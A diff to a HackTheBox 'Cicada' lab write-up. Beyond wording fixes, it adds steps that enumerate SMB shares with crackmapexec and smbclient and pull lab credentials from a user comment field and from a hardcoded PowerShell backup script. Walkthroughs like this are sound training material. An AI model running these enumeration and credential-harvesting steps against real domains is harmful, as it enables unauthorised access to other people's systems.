@@ -3,7 +3,7 @@ layout: writeup
 category: HTB
 date: 2024-12-29
 comments: false
-tags: 
+tags: smb winrm defaultpassword missconfiguration crackmapexec 
 ---
 
 <br />
@@ -326,7 +326,7 @@ SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrigh
 
 <br />
 
-However, they don't work for `WinRM`:
+However, they don't work for WinRM:
 
 <br />
 
@@ -339,7 +339,7 @@ HTTP        10.10.11.35     5985   CICADA-DC        [-] cicada.htb\michael.wrigh
 
 <br />
 
-This user doesn't have any additional permissions or access to a new share resources:
+This user doesn't have any additional permissions or access to new shared resources:
 
 <br />
 
@@ -385,7 +385,7 @@ SMB         10.10.11.35     445    CICADA-DC        cicada.htb\emily.oscars
 
 Interestingly, we find a plaintext password embedded in the user comment field: `david.orelious:aRt$Lp#7t*VQ!3`. 
 
-This is a common `misconfiguration` in real world environments and could lead to direct access.
+This is a common misconfiguration in real-world environments and could lead to direct access.
 
 <br />
 
@@ -405,7 +405,7 @@ SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\david.oreliou
 
 <br />
 
-However, don't work for `WinRM`:
+However, don't work for WinRM:
 
 <br />
 
@@ -418,4 +418,72 @@ HTTP        10.10.11.35     5985   CICADA-DC        [-] cicada.htb\david.oreliou
 
 <br />
 
+If we enumerate the smb shared resources for this user, we have read permissions in one new resource `(DEV)`:
 
+<br />
+
+```bash
+❯ cme smb cicada.htb -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares
+SMB         10.10.11.35     445    CICADA-DC        [*] Windows 10.0 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
+SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
+SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
+SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
+SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
+SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
+SMB         10.10.11.35     445    CICADA-DC        DEV             READ            
+SMB         10.10.11.35     445    CICADA-DC        HR              READ            
+SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
+SMB         10.10.11.35     445    CICADA-DC        NETLOGON        READ            Logon server share 
+SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share
+```
+
+<br />
+
+We can access the `DEV` share with `smbclient`:
+
+<br />
+
+```bash
+❯ smbclient //cicada.htb/DEV -U david.orelious
+Password for [WORKGROUP\david.orelious]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Thu Mar 14 13:31:39 2024
+  ..                                  D        0  Thu Mar 14 13:21:29 2024
+  Backup_script.ps1                   A      601  Wed Aug 28 19:28:22 2024
+
+		4168447 blocks of size 4096. 477732 blocks available
+```
+
+<br />
+
+Inside this shared resource, we can see a `PowerShell` script named `"Backup_script.ps1"`.
+
+We download it and list its contents:
+
+<br />
+
+```PowerShell
+$sourceDirectory = "C:\smb"
+$destinationDirectory = "D:\Backup"
+
+$username = "emily.oscars"
+$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
+$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
+$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
+$backupFileName = "smb_backup_$dateStamp.zip"
+$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
+Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
+Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
+```
+
+<br />
+
+Analyzing it we found more credentials: `emily.oscars:Q!3@Lp#M6b*7t*Vt`
+
+<br />
+
+### emily.oscars:
+
+<br />
